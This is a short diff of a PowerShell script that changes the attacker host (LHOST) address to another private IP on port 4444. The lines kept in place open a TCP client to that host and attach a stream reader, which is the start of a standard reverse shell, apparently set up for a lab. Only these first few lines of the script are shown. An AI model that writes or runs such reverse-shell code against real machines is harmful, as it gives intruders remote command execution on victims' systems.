@@ -1,4 +1,4 @@
-$LHOST = "192.168.40.129"; $LPORT = 4444; 
+$LHOST = "192.168.172.128"; $LPORT = 4444; 
 $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
 $NetworkStream = $TCPClient.GetStream(); 
 $StreamReader = New-Object IO.StreamReader($NetworkStream); 
